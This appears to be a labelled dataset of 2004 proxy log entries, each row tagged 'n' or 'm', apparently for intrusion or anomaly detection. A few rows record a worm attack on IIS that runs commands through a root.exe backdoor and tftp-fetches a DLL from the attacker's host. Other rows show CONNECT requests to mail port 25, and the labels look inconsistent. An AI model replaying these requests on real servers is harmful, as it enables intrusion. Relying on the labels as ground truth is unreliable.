rowIndex, row, class
1097, 12.221.212.151 - - [10/Mar/2004:01:23:27 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; DigiExt )", n
1098, 12.221.212.151 - - [10/Mar/2004:01:23:27 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; MSIE 5.01; Windows 98; athome020 )", n
1099, 203.156.79.200 - - [10/Mar/2004:01:23:47 -0500] "GET http://203.156.79.200/members/sex/fuck/id000026id/lund404lundxxx.html HTTP/1.0" 401 0 "-" "-", n
1100, 212.160.136.163 - - [10/Mar/2004:01:24:01 -0500] "GET http://searchezprovider.com/search.php?ID=321&fString=game+auction HTTP/1.0" 302 0 "http://www.entresgroup.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1101, 192.117.242.67 - - [10/Mar/2004:01:24:09 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1102, 212.160.136.163 - - [10/Mar/2004:01:24:09 -0500] "GET http://searchezprovider.com/search_results.php?fSearch_id=9aac05b1e26edb2c&fString=game+auction HTTP/1.0" 200 8701 "http://www.entresgroup.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1103, 24.2.98.227 - - [10/Mar/2004:01:24:13 -0500] "GET http://www.bangbus.com HTTP/1.0" 200 5121 "-" "Mozilla/3.0 (compatible)", n
1104, 212.160.136.163 - - [10/Mar/2004:01:24:14 -0500] "GET http://searchezprovider.com/redirect.php?fID=49227206 HTTP/1.0" 302 0 "http://searchezprovider.com/search_results.php?fSearch_id=9aac05b1e26edb2c&fString=game+auction" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1105, 24.235.131.196 - - [10/Mar/2004:01:24:16 -0500] "GET http://www.thevalkyrie.com/iframe.php HTTP/1.0" 302 237 "http://www.thevalkyrie.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1106, 12.221.212.151 - - [10/Mar/2004:01:24:19 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; DigiExt )", n
1107, 12.221.212.151 - - [10/Mar/2004:01:24:19 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; MSIE 5.01; Windows 98; athome020 )", n
1108, 212.160.136.163 - - [10/Mar/2004:01:24:21 -0500] "GET http://69.42.66.93/xmlfeed3/go.php?link_id=8293fb5286b8e16ffeb63beab7c71276&aff_id=169&sid=82130ee98bc6d571c1bdfe259f023376 HTTP/1.0" 302 9 "http://searchezprovider.com/search_results.php?fSearch_id=9aac05b1e26edb2c&fString=game+auction" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1109, 212.160.136.163 - - [10/Mar/2004:01:24:23 -0500] "GET http://partners.mygeek.com/presults.jsp?partnerid=98626&vendorId=82515&type=5&code=1&rate=483664362&cr=483664362&domain=is1.websearch.com&query=1078899833103%3A%3A66.70.43.120%3A%3Agame+auction&url=http%3A%2F%2Fis1.websearch.com%2Fwebsrch.barweb.169%2Fredirs_all.htm%3Fpgtarg%3Dwbsdogpile%26qkw%3Dgame%2520auction%26qcat%3Dweb HTTP/1.0" 302 362 "http://searchezprovider.com/search_results.php?fSearch_id=9aac05b1e26edb2c&fString=game+auction" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", m
1110, 212.160.136.163 - - [10/Mar/2004:01:24:24 -0500] "GET http://is1.websearch.com/websrch.barweb.169/redirs_all.htm?pgtarg=wbsdogpile&qkw=game%20auction&qcat=web HTTP/1.0" 302 0 "http://searchezprovider.com/search_results.php?fSearch_id=9aac05b1e26edb2c&fString=game+auction" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1111, 212.160.136.163 - - [10/Mar/2004:01:24:28 -0500] "GET http://is1.websearch.com/_1_2TIUTD604RZNBP1__websrch.barweb.169/dog/results?otmpl=dog/webresults.htm&qkw=game%20auction&qcat=web&top=1&nextId=&start=&ver=4958 HTTP/1.0" 200 43250 "http://searchezprovider.com/search_results.php?fSearch_id=9aac05b1e26edb2c&fString=game+auction" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1112, 192.117.242.67 - - [10/Mar/2004:01:24:39 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1113, 61.172.244.232 - - [10/Mar/2004:01:24:50 -0500] "CONNECT 209.15.20.130:25 HTTP/1.0" 200 - "-" "-", n
1114, 24.235.131.196 - - [10/Mar/2004:01:24:58 -0500] "GET http://www.tiedsex.com/iframe.php HTTP/1.0" 302 281 "http://www.tiedsex.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1115, 24.235.131.196 - - [10/Mar/2004:01:25:12 -0500] "GET http://www.time.com/iframe.php HTTP/1.0" 302 0 "http://www.time.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1116, 221.7.192.11 - - [10/Mar/2004:01:25:26 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1117, 218.72.85.59 - - [10/Mar/2004:01:25:46 -0500] "GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.1" 200 2220 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)", n
1118, 221.7.192.11 - - [10/Mar/2004:01:26:04 -0500] "GET http://www.ccbbs.cn/ HTTP/1.1" 200 12711 "http://www.ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1119, 24.235.131.196 - - [10/Mar/2004:01:26:19 -0500] "GET http://www.totallylatinos.com/iframe.php HTTP/1.0" 302 0 "http://www.totallylatinos.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1120, 24.235.131.196 - - [10/Mar/2004:01:26:23 -0500] "GET http://www.traci-sex.com/iframe.php HTTP/1.0" 200 339 "http://www.traci-sex.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1121, 12.221.212.151 - - [10/Mar/2004:01:26:24 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.73 ( compatible; MSIE 4.01; Windows XP; DigiExt )", n
1122, 12.221.212.151 - - [10/Mar/2004:01:26:24 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; [jp]; Windows NT4.0; NetCaptor )", n
1123, 218.78.209.42 - - [10/Mar/2004:01:26:44 -0500] "CONNECT 209.15.20.163:25 HTTP/1.0" 200 - "-" "-", n
1124, 192.117.242.67 - - [10/Mar/2004:01:26:57 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1125, 12.221.212.151 - - [10/Mar/2004:01:27:05 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; MSIE 4.01; Windows NT4.0; DigiExt )", n
1126, 12.221.212.151 - - [10/Mar/2004:01:27:08 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.7 ( compatible; [de]; Windows NT4.0; DigiExt )", n
1127, 203.121.182.141 - - [10/Mar/2004:01:28:15 -0500] "CONNECT 209.15.20.28:25 HTTP/1.0" 200 - "-" "-", n
1128, 24.235.131.196 - - [10/Mar/2004:01:28:21 -0500] "GET http://www.treehorn.net/iframe.php HTTP/1.0" 500 414 "http://www.treehorn.net/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1129, 61.237.215.17 - - [10/Mar/2004:01:28:21 -0500] "GET http://mine-seek.com/search.php?ID=19&fString=Sales HTTP/1.0" 302 0 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1130, 61.237.215.17 - - [10/Mar/2004:01:28:24 -0500] "GET http://mine-seek.com/search_results.php?fSearch_id=f6894e70cead410e&fString=sales HTTP/1.0" 200 15413 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1131, 61.237.215.17 - - [10/Mar/2004:01:28:29 -0500] "GET http://mine-seek.com/redirect.php?fID=2862149 HTTP/1.0" 302 0 "http://mine-seek.com/search_results.php?fSearch_id=f6894e70cead410e&fString=sales" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1132, 61.237.215.17 - - [10/Mar/2004:01:28:29 -0500] "GET http://feed.genieknows.com/search/xml/Monitor?enc=wo%24y%25uMx%25%25%21J%3F%3F%28%28%28%3Eu%21y%7C+%25%3Es+%7D%3Fs%7Cys%7B%3Eq%24%21%29O%7BM%24q%7Cu%246q%7D%21KrMCB%406q%7D%21K%21M%7Bq%7E++t%7Cu6q%7D%21K%24Mwu%7EyuD6q%7D%21K%21+%24MA6q%7D%21K%24ytMFHAIFvuv%3DAqtI%3DD%40su%3DHqEq%3DruFGGFH%40CIts6q%7D%21K%7CMx%25%25%215CQ5BV5BV%28%28%28%3E%7Bq%7E++t%7Cu%3Es+%7D5BVs%7Cys%7B%25x%23+%26wx%3Es++%7C5CVuyt5CTA5BFs%7Cys%7Byt5CTABDHFDHF5BFyt5CTGGG%40AFAB5BF%7Cyt5CTrx%7E%7Ery%7E%7Er%7B%7E%7Er+%7Ewr%7D%7Exr%7B%7E%7Dr+%7Exr%7D%7Ey5BF%22%26u%23*5CT%24q%7Cu%246worytM%40%3E%40AIB6s+ro%27q%7CM%40%3E%40%40FGB%40%40%40%40CAIAHBHGB6wo%22%23*M%24q%7Cu%246woqvvytMBF6woy%21MFH%3EDH%3EA%40F%3EA%40I6wosqsxuM%5E6wos%7CytM%5DY%5EUcUU%5BoE%40G%40%01 HTTP/1.0" 200 566 "http://mine-seek.com/search_results.php?fSearch_id=f6894e70cead410e&fString=sales" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
1133, 203.121.182.144 - - [10/Mar/2004:01:28:37 -0500] "CONNECT 200.59.32.194:25 HTTP/1.0" 200 - "-" "-", n
1134, 192.117.242.67 - - [10/Mar/2004:01:29:06 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1135, 61.172.244.109 - - [10/Mar/2004:01:29:07 -0500] "CONNECT 209.15.20.239:25 HTTP/1.0" 200 - "-" "-", n
1136, 24.235.131.196 - - [10/Mar/2004:01:29:09 -0500] "GET http://www.ushockeynews.com/iframe.php HTTP/1.0" 404 1203 "http://www.ushockeynews.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1137, 192.117.242.67 - - [10/Mar/2004:01:29:11 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1138, 203.121.182.142 - - [10/Mar/2004:01:29:23 -0500] "CONNECT 166.114.250.146:25 HTTP/1.0" 500 436 "-" "-", n
1139, 221.7.192.11 - - [10/Mar/2004:01:29:42 -0500] "GET http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3 HTTP/1.1" 200 578 "http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 95)", m
1140, 24.235.131.196 - - [10/Mar/2004:01:29:56 -0500] "GET http://www.victoriagivens.com/iframe.php HTTP/1.0" 404 204 "http://www.victoriagivens.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1141, 24.235.131.196 - - [10/Mar/2004:01:29:58 -0500] "GET http://www.vgirl.com/iframe.php HTTP/1.0" 302 200 "http://www.vgirl.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1142, 24.235.131.196 - - [10/Mar/2004:01:30:13 -0500] "GET http://www.vailspage.com/iframe.php HTTP/1.0" 404 592 "http://www.vailspage.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1143, 24.235.131.196 - - [10/Mar/2004:01:30:31 -0500] "GET http://www.virginsclub.com/iframe.php HTTP/1.0" 302 287 "http://www.virginsclub.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1144, 24.235.131.196 - - [10/Mar/2004:01:30:42 -0500] "GET http://www.visualsex.com/iframe.php HTTP/1.0" 404 461 "http://www.visualsex.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1145, 24.235.131.196 - - [10/Mar/2004:01:30:50 -0500] "GET http://www.virginz.com/iframe.php HTTP/1.0" 404 518 "http://www.virginz.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1146, 67.68.167.140 - - [10/Mar/2004:01:30:59 -0500] "GET http://www.glocksoft.net/cgi-bin/jenv.cgi HTTP/1.0" 200 1169 "-" "Mozilla/4.0", n
1147, 24.235.131.196 - - [10/Mar/2004:01:31:20 -0500] "GET http://www.voyeurscene.com/iframe.php HTTP/1.0" 404 395 "http://www.voyeurscene.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1148, 220.173.17.142 - - [10/Mar/2004:01:31:36 -0500] "GET http://track.ppmdating.com/ci.cfm?VTLID=501164&VTCID=206 HTTP/1.1" 200 43 "http://www.business.com" "Mozilla/4.75 [en-us] (Win98; I)", n
1149, 220.173.17.142 - - [10/Mar/2004:01:31:38 -0500] "GET http://images.ppmdating.com/CreativeImages/Image_CID206_IMG1.gif HTTP/1.1" 200 9272 "http://www.business.com" "Mozilla/4.75 [en-us] (Win98; I)", n
1150, 12.221.212.151 - - [10/Mar/2004:01:31:45 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; [de]; Windows 98; ezn IE )", n
1151, 12.221.212.151 - - [10/Mar/2004:01:31:45 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.0 ( compatible; [jp]; Windows 98; DigiExt )", n
1152, 192.117.242.67 - - [10/Mar/2004:01:31:52 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1153, 24.235.131.196 - - [10/Mar/2004:01:32:34 -0500] "GET http://www.wetlesbians.com/iframe.php HTTP/1.0" 302 0 "http://www.wetlesbians.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1154, 24.235.131.196 - - [10/Mar/2004:01:33:11 -0500] "GET http://www.wives-amateur-sex.com/iframe.php HTTP/1.0" 404 30610 "http://www.wives-amateur-sex.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1155, 203.121.182.140 - - [10/Mar/2004:01:33:34 -0500] "CONNECT 200.170.34.57:25 HTTP/1.0" 500 434 "-" "-", m
1156, 221.7.192.11 - - [10/Mar/2004:01:33:56 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 15631 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1157, 221.7.192.11 - - [10/Mar/2004:01:34:02 -0500] "GET http://ccbbs.cn/ HTTP/1.1" 200 12711 "http://ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
1158, 192.117.242.67 - - [10/Mar/2004:01:34:07 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1159, 192.117.242.67 - - [10/Mar/2004:01:34:07 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1160, 24.235.131.196 - - [10/Mar/2004:01:34:17 -0500] "GET http://www.xss.com/iframe.php HTTP/1.0" 404 2118 "http://www.xss.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1161, 61.237.215.17 - - [10/Mar/2004:01:34:35 -0500] "GET http://eyesontheworldwideweb.com/search.php?ID=44&fString=Sales HTTP/1.0" 302 0 "http://www.linkou.con.cn" "Mozilla/4.5 [en] (Win98; I)", n
1162, 61.237.215.17 - - [10/Mar/2004:01:34:37 -0500] "GET http://eyesontheworldwideweb.com/search_results.php?fSearch_id=74d1a99f2e279e91&fString=sales HTTP/1.0" 200 16274 "http://www.linkou.con.cn" "Mozilla/4.5 [en] (Win98; I)", n
1163, 61.237.215.17 - - [10/Mar/2004:01:34:43 -0500] "GET http://eyesontheworldwideweb.com/redirect.php?fID=7162258 HTTP/1.0" 302 0 "http://eyesontheworldwideweb.com/search_results.php?fSearch_id=74d1a99f2e279e91&fString=sales" "Mozilla/4.5 [en] (Win98; I)", n
1164, 61.237.215.17 - - [10/Mar/2004:01:34:45 -0500] "GET http://www.findology.com/2.php?sid=1426-17204&keyword=sales&goto=0a377eef279a11d43fe4e8ce510082fd-MTA3ODkwMDQ2Nwk2OC40OC4xMDYuMTA5CQlwX3JzMDEJMTQyNglzYWxlcwlhaC1oYQlodHRwOi8vYy5haC1oYS5jb20vYz9lMT1wZHVKZkVUcENnbHNwS1F4aXBabm11Z0R6dzVrV2ZsM3F2UFJZdFF4bEU0M1hMSlpCcWtkUW1RNHp6U0JCZnh2T29WekxzekNVcG13SHZ4UU9KTWNuQWtjZHFURWxGTkNObjBCUlRZVndCY0EwQ3ZNcXJWY0o1eGNQSktnRVV5VWJodHJNSm5Sc3hWQ1Jmd1ROWWhhbE5GdGhlTGx1M2htNHNsaExZcHZJbmVPSm93emxIV25pNFRkRVhMYlcyTkJKd2V1UDRkdlZtRXR3SFJPbzNrZ3JReXV0NVlGMkVxNHppMUhUd2pUTmtmTE9FTTFGMU41R3lnTDFpMWVQZ2lwaXExVGI1ZFBWd0cxbEIybVJ2NG9QZXBjQlV4ZGcmaD1oNUFla0hLbFVoQVdKUENZViZiPTEwMzM1MwkwLjAyCTAJMQkxNzIwNAk%3D HTTP/1.0" 200 1246 "http://eyesontheworldwideweb.com/search_results.php?fSearch_id=74d1a99f2e279e91&fString=sales" "Mozilla/4.5 [en] (Win98; I)", m
1165, 68.48.142.117 - - [10/Mar/2004:01:35:01 -0500] "GET /scripts/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1166, 24.235.131.196 - - [10/Mar/2004:01:35:17 -0500] "GET http://www.xxxmovievault.com/iframe.php HTTP/1.0" 302 232 "http://www.xxxmovievault.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1167, 212.160.136.163 - - [10/Mar/2004:01:35:18 -0500] "GET http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant HTTP/1.0" 200 41748 "http://fiskarsforyou.w.interia.pl/eng/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
1168, 24.235.131.196 - - [10/Mar/2004:01:35:22 -0500] "GET http://www.xxxrookies.com/iframe.php HTTP/1.0" 404 295 "http://www.xxxrookies.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1169, 24.235.131.196 - - [10/Mar/2004:01:35:38 -0500] "GET http://www.xxxhouston.com/iframe.php HTTP/1.0" 404 14151 "http://www.xxxhouston.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1170, 212.160.136.163 - - [10/Mar/2004:01:35:41 -0500] "GET http://www.blowsearch.com/r.php?mc=39506667=qvohfAAA5252822626110981211=DAHAAA24850535=qvxpvypAAAgangyhfabp=lerhdAAA05284865=qvAAA2=qvrAAA81DDD1=qvoAAAnefekenkgmyauoyatotacobaaotauo=qvgAAA5118=abvgvfbc?ybbpDDDuthbeugxpvyp/zbpDDDryqbbanxDDDjjj//CCCcgguCCCCCCMMM112CCCCCC931DDD1CCCCCCgangyhfabpCCCCCC9161109812OOO1377118308OOO012DDD712DDD95DDD97CCCCCC9125109812CCCCCC012DDD712DDD95DDD97CCCCCCehgenCCCCCC]ryqbbanX[CCCCCC1377118308&v=5f23d1932a94ef0c18761e8607680bd7 HTTP/1.0" 302 2 "http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", m
1171, 212.160.136.163 - - [10/Mar/2004:01:35:41 -0500] "GET http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search HTTP/1.0" 200 13762 "http://www.power.lift.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)", n
1172, 212.160.136.163 - - [10/Mar/2004:01:35:45 -0500] "GET http://www.kanoodle.com/clickthrough.cool?position=7004&tid=bhngbnnobpngbgnlbhnlztxarxrsra&bid=0.07&eid=1&id=45737149&query=consultant&clickid=42494731&UNQ=0010789005151171414&subid=65559482 HTTP/1.0" 301 329 "http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
1173, 212.160.136.163 - - [10/Mar/2004:01:35:48 -0500] "GET http://www.yoomy.com/Go.php?Record=5466416&yo=6c39f2eff1db317cea9fee5ec33113d9 HTTP/1.0" 302 0 "http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)", n
1174, 212.160.136.163 - - [10/Mar/2004:01:35:51 -0500] "GET http://partners.mygeek.com/presults.jsp?partnerid=98683&vendorId=97087&type=1&code=0&rate=725362362&cr=725362362&domain=www.franchisegator.com&query=1078900546227%3A%3A192.168.1.103%3A%3Achildren&url=http%3A%2F%2Fwww.looksmart.com%2Fog%2Fpr%3DPsr%3Bro%3D3%3Brc%3D4%3Bla%3D183188%3Blm%3D82675%3Bli%3D102572757%3Bed%3D20040126%3Bii%3D8070.1d5b.404ea7fe.6b32%3Bpn%3D%3Bto%3D%3Btc%3D4%3Bpo%3D3%3Bpc%3D4%3Bpi%3Dlzd%3Bts%3D%7Chttp%3A%2F%2Fwww.franchisegator.com%2Fcgi-bin%2Fprofile.php%3Fkey%3D36%26f_type%3D9 HTTP/1.0" 302 482 "http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)", m
1175, 212.160.136.163 - - [10/Mar/2004:01:35:51 -0500] "GET http://leadership-international.org/?source=kanoodle HTTP/1.0" 200 17183 "http://www.blowsearch.com/search.php?affiliate=artur&keywords=consultant" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
1176, 68.48.142.117 - - [10/Mar/2004:01:35:51 -0500] "GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1177, 68.48.142.117 - - [10/Mar/2004:01:35:51 -0500] "GET /scripts/httpodbc.dll HTTP/1.0" 404 288 "-" "-", m
1178, 212.160.136.163 - - [10/Mar/2004:01:35:52 -0500] "GET http://www.looksmart.com/og/pr=Psr;ro=3;rc=4;la=183188;lm=82675;li=102572757;ed=20040126;ii=8070.1d5b.404ea7fe.6b32;pn=;to=;tc=4;po=3;pc=4;pi=lzd;ts=%7Chttp://www.franchisegator.com/cgi-bin/profile.php?key=36&f_type=9 HTTP/1.0" 302 249 "http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)", n
1179, 212.160.136.163 - - [10/Mar/2004:01:35:58 -0500] "GET http://www.franchisegator.com/cgi-bin/profile.php?key=36&f_type=9 HTTP/1.0" 200 33226 "http://www.yoomy.com/Search1.php?ID=153&Q=children&B3=Search" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT)", n
1180, 218.68.219.92 - - [10/Mar/2004:01:36:01 -0500] "GET http://www.searchpat.com/cgi-bin/smartsearch.cgi?username=discovery&keywords=Health+Insurance HTTP/1.0" 200 20599 "http://www.searchpat.com/cgi-bin/smartsearch.cgi?username=discovery" "Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90)", n
1181, 24.235.131.196 - - [10/Mar/2004:01:36:03 -0500] "GET http://www.youngflasher.com/iframe.php HTTP/1.0" 404 26224 "http://www.youngflasher.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
1182, 218.68.219.92 - - [10/Mar/2004:01:36:07 -0500] "GET http://www.searchpat.com/cgi-bin/sf.cgi?t=f7&keys=zhhvzhahanhazfhyacsxhvadsoamhszszyzszczxzsayayzxzxznsfaahdananakhaasssacamadaaaoazsshisizshaavszsshvaisizssaspavzzzszpsxahahaiaazoazsdzvskzxzmscspzosmsasihczzhzzczfznsxsysyzkahsoaxsaaszxzazzhvsxaksysdsfzisaspavhdzxzszyzizdzkzyazayzxzyzhhzzyhszihfzazxhffazzhsdfdnddzdzzhfzoazavzfzhfzhxhdavsoapsssaamsszazxhdsmsmazanafaazazvsazczxhazzzoskshsvavasshfczchdahaksxakadzyahsozdzxzfhxzhhszihhfazzzxsasazdzzhizpfzzhhfsnhahpzazzhshfzxzczmddzdhfadscanzdzzhiaiasaoaiaxzihvaissanshaxaiazsaaasdsoszacacavamapazavsdanhfzxfczhhsahsssyzohshhzchfzszsfzzhhiapaxssassyzazpazfhzczasyspavafhksfacanahassdaksdshsssksvxzaphfsiaxazhnapsfadafahsdaksyhmaiadaafczzhffpahsodvzhhssxaasyskhyaxaaassaziacsiaxhoavandoahzcccandiznsmschdananakhahszszxzxhmznzphnszsksnzhzpacanfohvsfsvsvhvadsosihcsxamanspznshzczszvaxxpfxzmszafayapzssaspavzzzxzfzzzhzzsysdshznsihxzoavszddzmzzhozpzizdzyhdhkzszfhnzyzohphvzoapzszysfzmsisaakzkaxsxsfakssssaasdsxzzfpfdhszfzpaxsczxzmszafav&kw=health+insurance HTTP/1.0" 302 692 "http://www.searchpat.com/cgi-bin/smartsearch.cgi?username=discovery&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90)", m
1183, 218.68.219.92 - - [10/Mar/2004:01:36:09 -0500] "GET http://66.77.183.152/Search?fig=3157&evid=CE0070c3faac&eng=Kanoodle-11-2002&cb=WbAnyWay&dest=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Fposition%3D7001%26tid%3Dbhngbnnobpngbgnpbgnnzixdxaxxrt%26bid%3D0.16%26eid%3D1%26id%3D77833714%26query%3Dhealth%2520insurance%26clickid%3D35134%26UNQ%3D00107890090736959491&engid=1708&gid=5663&af=0&qtype=0&qw=health+insurance&ts=1078900549&cs=99ad0/2 HTTP/1.0" 302 389 "http://www.searchpat.com/cgi-bin/smartsearch.cgi?username=discovery&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90)", m
1184, 221.7.192.11 - - [10/Mar/2004:01:36:19 -0500] "GET http://www.ccbbs.cn/ HTTP/1.1" 200 12711 "http://www.ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)", n
